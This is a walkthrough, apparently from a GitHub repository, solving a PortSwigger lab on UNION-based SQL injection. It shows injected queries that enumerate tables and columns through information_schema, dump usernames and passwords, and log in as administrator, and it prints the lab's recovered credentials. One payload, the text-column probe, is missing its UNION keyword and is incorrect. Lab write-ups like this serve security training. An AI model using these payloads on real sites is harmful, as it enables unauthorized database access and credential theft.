
## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/7d6984950e53994e4fcf4b47b99b9d9f711d3fd8/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/Images/Lab%20Description.png)

## Solution :

Most database types (with the notable exception of Oracle) have a set of views called the `information schema` which provide information about the database.

You can query `information_schema.tables` to list the tables in the database:

```sql
SELECT * FROM information_schema.tables
```
O/P shows the columns present in it

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

## Steps


#### Determine the number of columns -

**ORDER BY 2**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 2--
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/6357f92d8b0690254abb9272ead8c0e620f01eb8/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/Images/Number%20of%20Columns.png)

#### Determine wich column contains text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' SELECT 'abc','def'--
```
Both the columns contain text data.

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/2c530c092ff1c047df3426238f59e4619a833296/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/Images/Column%20contain%20String.png)

### List the database contents

#### List tables -

From the information schema tables, there are some default columns.

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/b71dd2bec785812c259e46ad6f10b153f1c7b645/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/Images/Default%20Columns.png)


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM information_schema.tables--
```

We get list of all the available tables along with table name.

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/5dee9c1d3c67aab670e4902065b0f1ebc18cba6e/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/Images/Available%20Tables.png)

![image]()


#### List columns -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_fhlhke'--
```

We get these columns

![image]()

columns - `username_yoqrkg` & `password_btqiad`

#### Retreive information from the columns username_yoqrkg & password_btqiad from the table users_fhlhke -


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username_yoqrkg,password_btqiad FROM users_fhlhke--
```
Now we get the username and password of all users.

![image]()

administrator - `a80zs35scefit206tw5s`
carlos - `hfs0tq3xzvdz2awja6bn`
wiener - `7qsyjg4sbbxt16easf7l`

Now login as administrator,

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/2b18f70ab6dbf6f1f699ae6cdfe328ac61f01d47/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/Images/Lab%20Solution.png)

